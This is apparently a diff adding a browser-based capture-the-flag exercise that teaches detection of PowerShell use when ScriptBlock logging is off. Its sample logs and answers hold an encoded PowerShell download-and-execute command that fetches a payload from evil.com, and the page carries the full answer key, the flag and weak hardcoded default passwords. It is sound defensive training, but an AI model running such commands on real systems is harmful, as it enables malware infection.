@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>CTF: Hunt for PowerShell Without Logging | ScriptBlock Disabled</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Fira Code', system-ui, monospace; }
+    body {
+      background: linear-gradient(160deg, #001a0a 0%, #002810 50%, #001a0a 100%);
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      padding: 1.5rem; margin: 0;
+    }
+    .container {
+      max-width: 1150px; width: 100%; background: rgba(5, 25, 10, 0.9);
+      backdrop-filter: blur(28px); border: 1px solid rgba(0, 255, 100, 0.35);
+      box-shadow: 0 25px 50px rgba(0, 200, 80, 0.2); border-radius: 2.8rem;
+      padding: 2rem; color: #c8ffd8;
+    }
+    h1 { font-size: 2.3rem; font-weight: 700; text-align: center; background: linear-gradient(135deg, #5eff8a, #00aa40); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.4rem; }
+    .subtitle { text-align: center; color: #8ad4a0; margin-bottom: 1.8rem; border-bottom: 1px dashed #2a5a3a; padding-bottom: 1rem; }
+    .panel { background: rgba(5, 20, 10, 0.8); border-radius: 1.8rem; padding: 1.7rem; border: 1px solid #2a5a3a; margin-bottom: 1.8rem; }
+    .hidden { display: none !important; }
+    .flex-row { display: flex; gap: 1.2rem; flex-wrap: wrap; align-items: center; }
+    input, button { background: #0a1a0f; border: 1px solid #3a6a4a; border-radius: 2rem; padding: 0.7rem 1.3rem; color: #d4ffe0; font-weight: 500; outline: none; font-size: 0.9rem; }
+    input:focus { border-color: #4dff80; box-shadow: 0 0 14px #33cc55; }
+    button { background: #1a3a20; border-color: #4daa60; cursor: pointer; font-weight: bold; }
+    button:hover { background: #255030; border-color: #66ff8a; box-shadow: 0 0 18px #33cc55; }
+    .task-card { background: #0a1a10; border-left: 6px solid #4dff80; padding: 1.2rem; border-radius: 1.3rem; margin: 1.2rem 0; animation: fadeIn 0.35s ease; }
+    @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
+    .log-line { background: #051008; border: 1px solid #2a4a30; padding: 0.5rem 1rem; border-radius: 0.6rem; margin: 0.4rem 0; font-family: 'Fira Code', monospace; font-size: 0.78rem; white-space: pre-wrap; color: #b8ffcc; }
+    .badge { background: #1a3a25; padding: 0.2rem 0.9rem; border-radius: 20px; font-size: 0.8rem; }
+    .toggle-container { background: #0a1a0f; border: 2px solid #3a6a4a; border-radius: 1.5rem; padding: 1.5rem; margin: 1rem 0; text-align: center; transition: all 0.5s ease; }
+    .toggle-container.disabled-view { border-color: #ff4444; background: #1a0505; }
+    .toggle-container.enabled-view { border-color: #4dff80; background: #051a08; }
+    .toggle-switch { position: relative; display: inline-block; width: 120px; height: 50px; margin: 0.5rem 0; }
+    .toggle-switch input { opacity: 0; width: 0; height: 0; }
+    .toggle-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: #3a1a1a; transition: 0.4s; border-radius: 50px; border: 2px solid #ff4444; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; font-size: 0.8rem; font-weight: bold; }
+    .toggle-slider:before { content: ""; position: absolute; height: 38px; width: 38px; left: 4px; bottom: 4px; background: #ff4444; transition: 0.4s; border-radius: 50%; }
+    input:checked + .toggle-slider { background: #1a3a1a; border-color: #4dff80; }
+    input:checked + .toggle-slider:before { transform: translateX(70px); background: #4dff80; }
+    .toggle-label-off { color: #ff6666; z-index: 1; }
+    .toggle-label-on { color: #66ff8a; z-index: 1; }
+    .decoder-box { background: #051008; border: 2px dashed #4daa60; border-radius: 1rem; padding: 1rem; margin: 0.8rem 0; font-family: 'Fira Code', monospace; }
+    .flag-box { background: #0a1a10; border: 2px dashed #ffd700; padding: 0.9rem; border-radius: 20px; text-align: center; font-weight: bold; font-size: 1.4rem; letter-spacing: 3px; color: #ffd700; animation: glowGold 1.7s infinite; }
+    @keyframes glowGold { 0% { box-shadow: 0 0 5px #ffd700; } 50% { box-shadow: 0 0 30px #ffaa00; } 100% { box-shadow: 0 0 5px #ffd700; } }
+    table { width: 100%; border-collapse: collapse; margin-top: 0.8rem; }
+    th { text-align: left; color: #6aff90; border-bottom: 1px solid #2a5a3a; padding: 0.4rem; }
+    td { padding: 0.4rem; border-bottom: 1px solid #1a3a22; }
+    .status-indicator { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 6px; }
+    .toast { position: fixed; top: 20px; right: 20px; background: #1a3a1a; border: 1px solid #4daa60; padding: 1rem 1.5rem; border-radius: 2rem; color: #b8ffcc; font-weight: bold; z-index: 9999; animation: slideIn 0.3s ease, fadeOut 0.3s 2.5s forwards; }
+    @keyframes slideIn { from { transform: translateX(100px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+    @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
+    code { background: #0a1a0f; padding: 0.2rem 0.6rem; border-radius: 12px; font-family: 'Fira Code', monospace; }
+    .gist-setup-box { background: #1a2a10; border: 2px solid #ffaa00; border-radius: 1rem; padding: 1.5rem; margin-bottom: 1.5rem; }
+    .gist-setup-box h3 { color: #ffcc44; margin-bottom: 0.8rem; }
+    .gist-setup-box summary { cursor: pointer; color: #ffcc44; font-weight: bold; font-size: 0.9rem; padding: 0.5rem 0; }
+    .gist-setup-box ol { color: #8ad4a0; font-size: 0.78rem; margin: 0.5rem 0; padding-left: 1.5rem; }
+    .gist-setup-box ol li { margin: 0.4rem 0; }
+    .gist-setup-box a { color: #66ff8a; }
+    .btn-warning { background: #3a2a00 !important; border-color: #cc8800 !important; color: #ffcc44 !important; }
+    .btn-danger { background: #3a1a1a !important; border-color: #aa3030 !important; color: #ffaaaa !important; }
+    .btn-info { background: #1a2a3a !important; border-color: #4488cc !important; color: #88ccff !important; }
+    .btn-info:hover { background: #2a3a4a !important; }
+    .btn-warning:hover { background: #4a3a00 !important; }
+    .btn-danger:hover { background: #4a1a1a !important; }
+    .btn-small { padding: 0.4rem 1rem !important; font-size: 0.8rem !important; }
+  </style>
+</head>
+<body>
+<div class="container" id="appContainer">
+
+  <!-- ============ LOGIN PAGE ============ -->
+  <div id="loginSection">
+    <h1>⚡ PS NO-LOG HUNTER</h1>
+    <div class="subtitle">PowerShell Without ScriptBlock Logging · Alternative Detection</div>
+    <div class="panel">
+      <div class="flex-row" style="justify-content: center;">
+        <button id="studentLoginBtn">🎓 Student Access</button>
+        <button id="adminLoginBtn">🛡️ Admin Panel</button>
+      </div>
+      <div id="studentLoginForm" class="hidden" style="margin-top:1.6rem; text-align:center;">
+        <input type="text" id="studentNameInput" placeholder="Your full name" autocomplete="off" style="width:70%;">
+        <input type="password" id="studentPassInput" placeholder="Student batch password" style="width:70%; margin-top:0.7rem;">
+        <button id="studentSubmitLogin" style="margin-top:0.8rem;">🔐 Enter CTF</button>
+        <p style="font-size:0.8rem; color:#8ad4a0; margin-top:0.5rem;">Default password: <code>pslog2025</code></p>
+      </div>
+      <div id="adminLoginForm" class="hidden" style="margin-top:1.6rem; text-align:center;">
+        <input type="password" id="adminPassInput" placeholder="Admin password">
+        <button id="adminSubmitLogin" style="margin-top:0.8rem;">🔑 Admin Login</button>
+        <p style="font-size:0.8rem; color:#8ad4a0; margin-top:0.5rem;">Default admin: <code>admin123</code></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ STUDENT DASHBOARD ============ -->
+  <div id="studentDashboard" class="hidden">
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+      <h2 style="color:#5eff8a;">👤 <span id="displayStudentName"></span></h2>
+      <button id="logoutStudentBtn">🚪 Logout</button>
+    </div>
+    <div id="taskContainer"></div>
+  </div>
+
+  <!-- ============ ADMIN DASHBOARD ============ -->
+  <div id="adminDashboard" class="hidden">
+    <div style="display:flex; justify-content:space-between; align-items:center;">
+      <h2 style="color:#6aff90;">🛡️ ADMINISTRATOR</h2>
+      <button id="logoutAdminBtn">Exit</button>
+    </div>
+    
+    <!-- GITHUB GIST SETUP SECTION -->
+    <div class="gist-setup-box">
+      <h3>☁️ GitHub Gist Setup for Cross-Device Sync</h3>
+      <p style="color:#8ad4a0; font-size:0.8rem; margin-bottom:0.8rem;">
+        <span id="gistStatusText" style="color:#ffaa66;">Status: 💾 Using Local Storage Only (Setup Gist for cross-device sync)</span>
+      </p>
+      
+      <details>
+        <summary>📖 Click for Step-by-Step Setup Instructions</summary>
+        <ol>
+          <li>Go to <a href="https://gist.github.com" target="_blank">gist.github.com</a> and sign in</li>
+          <li>Click <b>"+"</b> to create a new gist</li>
+          <li>Description: <code>CTF Data</code></li>
+          <li>Filename: <code>ctf-data.json</code></li>
+          <li>Content: <code>{"adminPass":"admin123","studentPass":"pslog2025","students":[]}</code></li>
+          <li>Click <b>"Create secret gist"</b></li>
+          <li>Copy the <b>Gist ID</b> from URL: <code>gist.github.com/YOURNAME/<b style="color:#ff4444;">abc123def456</b></code></li>
+          <li>Go to <a href="https://github.com/settings/tokens" target="_blank">github.com/settings/tokens</a></li>
+          <li>Generate classic token with only <b>"gist"</b> permission</li>
+          <li>Copy the token (starts with <code>ghp_</code>)</li>
+          <li>Paste both below and click Save</li>
+        </ol>
+      </details>
+      
+      <div style="margin-top:1rem; display:flex; flex-direction:column; gap:0.5rem;">
+        <input type="text" id="gistIdInput" placeholder="Gist ID (from step 7)" style="width:100%;">
+        <input type="password" id="githubTokenInput" placeholder="GitHub Token (ghp_... from step 10)" style="width:100%;">
+        <div class="flex-row">
+          <button id="saveGistBtn" class="btn-small btn-warning">💾 Save & Test Connection</button>
+          <button id="clearGistBtn" class="btn-small btn-danger">🗑️ Clear Config</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PASSWORD MANAGEMENT -->
+    <div class="panel">
+      <h3>🔐 Student Batch Password</h3>
+      <p style="font-size:0.8rem; color:#8ad4a0;">Current: <code id="currentStudentPassDisplay"></code></p>
+      <div class="flex-row">
+        <input type="text" id="newStudentPassword" placeholder="New student password">
+        <button id="updateStudentPasswordBtn">Update Password</button>
+      </div>
+      <hr style="border-color:#2a5a3a; margin:1.2rem 0;">
+      <h3>🔑 Admin Password</h3>
+      <p style="font-size:0.8rem; color:#8ad4a0;">Current: <code id="currentAdminPassDisplay"></code></p>
+      <div class="flex-row">
+        <input type="password" id="newAdminPassword" placeholder="New admin password">
+        <button id="updateAdminPasswordBtn">Update Password</button>
+      </div>
+      <hr style="border-color:#2a5a3a; margin:1.2rem 0;">
+      <h3>📋 Student Progress</h3>
+      <div class="flex-row" style="margin-bottom:0.8rem;">
+        <button id="pullFromGistBtn" class="btn-small btn-info">🔄 Pull from Gist</button>
+        <button id="pushToGistBtn" class="btn-small btn-info">📤 Push to Gist</button>
+      </div>
+      <div id="adminStudentList"></div>
+      <button id="resetAllProgressBtn" class="btn-small btn-danger" style="margin-top:1rem;">⚠️ Reset All Student Progress</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+    // ============ GIST CONFIG ============
+    let GIST_ID = localStorage.getItem('ctf_gist_id') || '';
+    let GITHUB_TOKEN = localStorage.getItem('ctf_github_token') || '';
+    
+    // ============ LOCAL STORAGE ============
+    const LS_ADMIN = 'ctf_admin_pass', LS_STUDENT = 'ctf_student_pass', LS_DATA = 'ctf_students_data';
+    const DEF_ADMIN = 'admin123', DEF_STUDENT = 'pslog2025';
+    
+    function getAdmin() { return localStorage.getItem(LS_ADMIN) || DEF_ADMIN; }
+    function getStudent() { return localStorage.getItem(LS_STUDENT) || DEF_STUDENT; }
+    function getData() { try { return JSON.parse(localStorage.getItem(LS_DATA)||'[]'); } catch(e) { return []; } }
+    function setAdmin(v) { localStorage.setItem(LS_ADMIN, v); }
+    function setStudent(v) { localStorage.setItem(LS_STUDENT, v); }
+    function setData(v) { localStorage.setItem(LS_DATA, JSON.stringify(v)); }
+    
+    if(!localStorage.getItem(LS_ADMIN)) setAdmin(DEF_ADMIN);
+    if(!localStorage.getItem(LS_STUDENT)) setStudent(DEF_STUDENT);
+    if(!localStorage.getItem(LS_DATA)) setData([]);
+
+    // ============ GIST SYNC ============
+    async function pullGist() {
+      if(!GIST_ID||!GITHUB_TOKEN) return false;
+      try {
+        const r = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+          headers: {'Authorization':`token ${GITHUB_TOKEN}`,'Accept':'application/vnd.github.v3+json'}
+        });
+        if(!r.ok) return false;
+        const d = await r.json();
+        const c = JSON.parse(d.files['ctf-data.json'].content);
+        setAdmin(c.adminPass||DEF_ADMIN); setStudent(c.studentPass||DEF_STUDENT); setData(c.students||[]);
+        return true;
+      } catch(e) { return false; }
+    }
+    
+    async function pushGist() {
+      if(!GIST_ID||!GITHUB_TOKEN) return false;
+      try {
+        const c = {adminPass:getAdmin(),studentPass:getStudent(),students:getData()};
+        const r = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+          method:'PATCH',
+          headers: {'Authorization':`token ${GITHUB_TOKEN}`,'Content-Type':'application/json','Accept':'application/vnd.github.v3+json'},
+          body: JSON.stringify({files:{'ctf-data.json':{content:JSON.stringify(c,null,2)}}})
+        });
+        return r.ok;
+      } catch(e) { return false; }
+    }
+
+    function updateGistStatus() {
+      const el = document.getElementById('gistStatusText');
+      if(!el) return;
+      if(GIST_ID) { el.textContent = 'Status: ☁️ Gist Connected - Syncing Across Devices'; el.style.color = '#66ff8a'; }
+      else { el.textContent = 'Status: 💾 Using Local Storage Only (Setup Gist for cross-device sync)'; el.style.color = '#ffaa66'; }
+    }
+
+    // ============ TASKS ============
+    const tasks = [
+      {id:1,title:"🔍 Task 1: Registry Key",desc:"Which registry value controls ScriptBlock logging? (ValueName = X)",answer:"EnableScriptBlockLogging = 0"},
+      {id:2,title:"📋 Task 2: Alternative Event IDs",desc:"Select TWO event IDs to hunt without ScriptBlock logs",answer:"4688, 400",extra:"eventIds"},
+      {id:3,title:"⚠️ Task 3: Suspicious Command",desc:"Find the encoded PowerShell command from logs",answer:"powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA",extra:"processLogs"},
+      {id:4,title:"🔓 Task 4: Decode Command",desc:"What action does the decoded command perform? (three words)",answer:"download malicious payload",extra:"decoder"},
+      {id:5,title:"🛡️ Task 5: GPO Fix",desc:"Full GPO path to enable ScriptBlock logging",answer:"Computer\\Administrative Templates\\Windows Components\\Windows PowerShell\\Turn on Script Block Logging = Enabled",extra:"gpo"}
+    ];
+    
+    const procLogs = [
+      "Event 4688: cmd.exe → whoami.exe",
+      "Event 4688: powershell.exe → powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA",
+      "Event 4688: powershell.exe → Get-Service"
+    ];
+    const encCmd = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA";
+    const decCmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.exe')";
+    const evOpts = [
+      {id:"4688",label:"4688 - Process Creation"},{id:"400",label:"400 - PowerShell Engine Start"},
+      {id:"4104",label:"4104 - ScriptBlock Logging"},{id:"4624",label:"4624 - Logon"},{id:"5156",label:"5156 - Network"}
+    ];
+
+    let currentUser = null, adminActive = false, loggingEnabled = false;
+
+    function toast(m,e) {
+      const x=document.querySelector('.toast'); if(x)x.remove();
+      const t=document.createElement('div'); t.className='toast';
+      t.style.background=e?'#3a1a1a':'#1a3a1a'; t.style.borderColor=e?'#aa3030':'#4daa60';
+      t.style.color=e?'#ffaaaa':'#b8ffcc'; t.textContent=m;
+      document.body.appendChild(t); setTimeout(()=>{if(t.parentNode)t.remove();},3000);
+    }
+
+    async function updateComp(name,tid) {
+      let s=getData(), st=s.find(x=>x.name.toLowerCase()===name.toLowerCase());
+      if(st&&!st.completedTasks.includes(tid)) {
+        st.completedTasks.push(tid); setData(s);
+        if(currentUser&&currentUser.name.toLowerCase()===name.toLowerCase()) currentUser.completedTasks=[...st.completedTasks];
+        await pushGist(); return true;
+      } return false;
+    }
+
+    function renderTasks() {
+      if(!currentUser) return;
+      document.getElementById('displayStudentName').innerText=currentUser.name;
+      const c=document.getElementById('taskContainer'), done=currentUser.completedTasks||[];
+      let h='<h3>⚡ PowerShell Logging Toggle</h3>';
+      h+=`<div class="toggle-container ${loggingEnabled?'enabled-view':'disabled-view'}"><p>🔧 ScriptBlock Logging:</p><label class="toggle-switch"><input type="checkbox" id="loggingToggle" ${loggingEnabled?'checked':''} onchange="toggleLogging(this.checked)"><span class="toggle-slider"><span class="toggle-label-off">OFF</span><span class="toggle-label-on">ON</span></span></label><p style="color:${loggingEnabled?'#66ff8a':'#ff6666'};">${loggingEnabled?'✅ ENABLED':'❌ DISABLED'}</p></div>`;
+      h+='<div style="background:#051008;border:1px solid #4daa60;padding:0.5rem 1rem;border-radius:0.8rem;margin:0.4rem 0;font-family:monospace;font-size:0.8rem;">📁 HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell<br>   EnableScriptBlockLogging = <span style="color:'+(loggingEnabled?'#66ff8a':'#ff6666')+';">'+(loggingEnabled?'1':'0')+'</span></div>';
+      tasks.forEach(t=>{
+        const dn=done.includes(t.id);
+        h+=`<div class="task-card" style="border-left-color:${dn?'#2ecc71':'#4dff80'};"><strong>${t.title}</strong> <span class="badge">${dn?'✅ Done':'🔒 Pending'}</span><p>${t.desc}</p>`;
+        if(t.extra==='eventIds') {
+          h+='<div style="display:flex;flex-wrap:wrap;gap:0.5rem;">';
+          evOpts.forEach(o=>h+=`<label style="cursor:pointer;padding:0.4rem 0.8rem;border-radius:1.5rem;background:#0a1a0f;border:1px solid #3a6a4a;"><input type="checkbox" class="evCb" value="${o.id}" ${dn?'disabled':''}> ${o.label}</label>`);
+          h+='</div>'; if(!dn) h+='<button onclick="submitEv()" style="margin-top:0.5rem;">✅ Submit Event IDs</button>';
+        } else if(t.extra==='processLogs') {
+          procLogs.forEach(l=>h+=`<div class="log-line" style="${l.includes('-enc')?'border-left:3px solid #ff4444;':''}">${l}${l.includes('-enc')?' ⚠️':''}</div>`);
+        } else if(t.extra==='decoder') {
+          h+=`<div class="decoder-box"><p style="color:#66ff8a;">🔓 Encoded:</p><p style="font-size:0.7rem;word-break:break-all;">${encCmd}</p><p style="color:#66ff8a;">📝 Decoded:</p><p style="color:#ffd700;">${decCmd}</p></div>`;
+        } else if(t.extra==='gpo') {
+          h+='<div class="log-line">📋 Computer Configuration\\...\\Windows PowerShell</div><div class="log-line">Setting: <span style="color:#66ff8a;">Turn on Script Block Logging</span></div>';
+        }
+        if(!dn&&t.extra!=='eventIds') h+=`<div style="display:flex;gap:0.5rem;margin-top:0.5rem;"><input type="text" id="ai${t.id}" placeholder="Your answer" style="flex:1;"><button onclick="submitT(${t.id})">✅ Submit</button></div>`;
+        else if(dn) h+='<p style="color:#9effb7;">✔ Completed</p>';
+        h+='</div>';
+      });
+      if(done.length===tasks.length) h+='<div class="flag-box">🏆 FLAG{POWERSHELL_NO_LOGGING} 🏆</div>';
+      c.innerHTML=h;
+    }
+
+    window.toggleLogging=e=>{loggingEnabled=e;renderTasks();};
+    window.submitEv=()=>{
+      if(!currentUser) return;
+      const s=Array.from(document.querySelectorAll('.evCb:checked')).map(c=>c.value);
+      if(s.length===2&&s.includes('4688')&&s.includes('400')){updateComp(currentUser.name,2);toast('✅ Correct!');renderTasks();}
+      else toast('❌ Need exactly 4688 and 400.',true);
+    };
+    window.submitT=async id=>{
+      if(!currentUser) return;
+      const inp=document.getElementById('ai'+id); if(!inp) return;
+      const a=inp.value.trim(),t=tasks.find(x=>x.id===id); if(!t) return;
+      let ok=a.toLowerCase()===t.answer.toLowerCase();
+      if(id===4){const l=a.toLowerCase();ok=ok||(l.includes('download')&&l.includes('payload'));}
+      if(ok){await updateComp(currentUser.name,id);toast('✅ Correct!');renderTasks();}
+      else{toast('❌ Incorrect.',true);inp.style.animation='shake 0.5s ease';setTimeout(()=>inp.style.animation='',500);}
+    };
+
+    function renderAdmin() {
+      const s=getData(), cont=document.getElementById('adminStudentList');
+      if(!cont) return;
+      document.getElementById('currentStudentPassDisplay').textContent=getStudent();
+      document.getElementById('currentAdminPassDisplay').textContent=getAdmin();
+      if(s.length===0){cont.innerHTML='<p style="color:#8ad4a0;">📭 No students yet.</p>';return;}
+      let h='<table><tr><th>Student</th><th>Done</th><th>Progress</th><th>Status</th></tr>';
+      s.forEach(st=>{
+        const cnt=(st.completedTasks||[]).length,pct=Math.round(cnt/tasks.length*100);
+        const sc=cnt===tasks.length?'#2ecc71':cnt>0?'#f39c12':'#e74c3c';
+        h+=`<tr><td>${st.name.replace(/[&<>"]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[m])}</td><td>${cnt}/${tasks.length}</td><td><div style="background:#0a1a0f;border-radius:10px;height:8px;width:100px;"><div style="width:${pct}%;height:100%;background:${sc};"></div></div></td><td><span class="status-indicator" style="background:${sc};"></span>${cnt===tasks.length?'Flag':'In Progress'}</td></tr>`;
+      });
+      h+='</table>'; cont.innerHTML=h;
+    }
+
+    function showLogin() {
+      document.getElementById('loginSection').classList.remove('hidden');
+      ['studentDashboard','adminDashboard','studentLoginForm','adminLoginForm'].forEach(id=>document.getElementById(id).classList.add('hidden'));
+      currentUser=null; adminActive=false;
+    }
+
+    async function showStudent() {
+      if(GIST_ID) await pullGist();
+      document.getElementById('loginSection').classList.add('hidden');
+      document.getElementById('studentDashboard').classList.remove('hidden');
+      document.getElementById('adminDashboard').classList.add('hidden');
+      renderTasks();
+    }
+
+    async function showAdmin() {
+      if(GIST_ID) await pullGist();
+      document.getElementById('loginSection').classList.add('hidden');
+      document.getElementById('studentDashboard').classList.add('hidden');
+      document.getElementById('adminDashboard').classList.remove('hidden');
+      document.getElementById('gistIdInput').value=GIST_ID;
+      document.getElementById('githubTokenInput').value=GITHUB_TOKEN;
+      updateGistStatus();
+      renderAdmin();
+    }
+
+    document.addEventListener('DOMContentLoaded',()=>{
+      document.getElementById('studentLoginBtn').addEventListener('click',()=>{
+        document.getElementById('studentLoginForm').classList.remove('hidden');
+        document.getElementById('adminLoginForm').classList.add('hidden');
+      });
+      document.getElementById('adminLoginBtn').addEventListener('click',()=>{
+        document.getElementById('adminLoginForm').classList.remove('hidden');
+        document.getElementById('studentLoginForm').classList.add('hidden');
+      });
+      document.getElementById('studentSubmitLogin').addEventListener('click',async()=>{
+        const n=document.getElementById('studentNameInput').value.trim();
+        const p=document.getElementById('studentPassInput').value.trim();
+        if(!n||!p){toast('Enter name and password.',true);return;}
+        if(GIST_ID) await pullGist();
+        if(p!==getStudent()){toast('Invalid password.',true);return;}
+        let s=getData(),st=s.find(x=>x.name.toLowerCase()===n.toLowerCase());
+        if(!st){st={name:n,completedTasks:[]};s.push(st);setData(s);if(GIST_ID) await pushGist();toast(`Welcome, ${n}!`);}
+        else toast(`Welcome back, ${n}!`);
+        currentUser={name:st.name,completedTasks:[...st.completedTasks]};
+        document.getElementById('studentNameInput').value='';
+        document.getElementById('studentPassInput').value='';
+        await showStudent();
+      });
+      document.getElementById('adminSubmitLogin').addEventListener('click',async()=>{
+        const p=document.getElementById('adminPassInput').value.trim();
+        if(GIST_ID) await pullGist();
+        if(p===getAdmin()){adminActive=true;document.getElementById('adminPassInput').value='';toast('Admin access.');await showAdmin();}
+        else toast('Invalid admin password.',true);
+      });
+      document.getElementById('logoutStudentBtn').addEventListener('click',()=>{toast('Logged out.');showLogin();});
+      document.getElementById('logoutAdminBtn').addEventListener('click',()=>{toast('Logged out.');showLogin();});
+      
+      // GIST BUTTONS
+      document.getElementById('saveGistBtn').addEventListener('click',async()=>{
+        const gid=document.getElementById('gistIdInput').value.trim();
+        const tok=document.getElementById('githubTokenInput').value.trim();
+        if(!gid||!tok){toast('Enter both Gist ID and Token.',true);return;}
+        GIST_ID=gid; GITHUB_TOKEN=tok;
+        localStorage.setItem('ctf_gist_id',gid); localStorage.setItem('ctf_github_token',tok);
+        updateGistStatus();
+        const ok=await pullGist();
+        if(ok){toast('✅ Gist connected! Data loaded.');renderAdmin();}
+        else toast('❌ Connection failed. Check Gist ID and Token.',true);
+      });
+      document.getElementById('clearGistBtn').addEventListener('click',()=>{
+        GIST_ID=''; GITHUB_TOKEN='';
+        localStorage.removeItem('ctf_gist_id'); localStorage.removeItem('ctf_github_token');
+        document.getElementById('gistIdInput').value=''; document.getElementById('githubTokenInput').value='';
+        updateGistStatus(); toast('🗑️ Gist config cleared.');
+      });
+      document.getElementById('pullFromGistBtn').addEventListener('click',async()=>{
+        if(!GIST_ID){toast('Configure Gist first.',true);return;}
+        const ok=await pullGist(); toast(ok?'✅ Data pulled!':'❌ Failed.'); renderAdmin();
+      });
+      document.getElementById('pushToGistBtn').addEventListener('click',async()=>{
+        if(!GIST_ID){toast('Configure Gist first.',true);return;}
+        const ok=await pushGist(); toast(ok?'✅ Data pushed!':'❌ Failed.');
+      });
+      
+      // PASSWORD BUTTONS
+      document.getElementById('updateStudentPasswordBtn').addEventListener('click',async()=>{
+        if(!adminActive) return;
+        const np=document.getElementById('newStudentPassword').value.trim();
+        if(!np){toast('Enter password.',true);return;}
+        setStudent(np); if(GIST_ID) await pushGist();
+        toast('✅ Password updated!'); document.getElementById('newStudentPassword').value=''; renderAdmin();
+      });
+      document.getElementById('updateAdminPasswordBtn').addEventListener('click',async()=>{
+        if(!adminActive) return;
+        const np=document.getElementById('newAdminPassword').value.trim();
+        if(!np){toast('Enter password.',true);return;}
+        setAdmin(np); if(GIST_ID) await pushGist();
+        toast('✅ Password changed!'); document.getElementById('newAdminPassword').value=''; renderAdmin();
+      });
+      document.getElementById('resetAllProgressBtn').addEventListener('click',async()=>{
+        if(!adminActive) return;
+        if(confirm('Reset ALL student progress?')){setData([]); if(GIST_ID) await pushGist(); toast('Reset.'); renderAdmin();}
+      });
+      
+      const style=document.createElement('style');
+      style.textContent='@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}';
+      document.head.appendChild(style);
+      showLogin();
+    });
+})();
+</script>
+</body>
+</html>
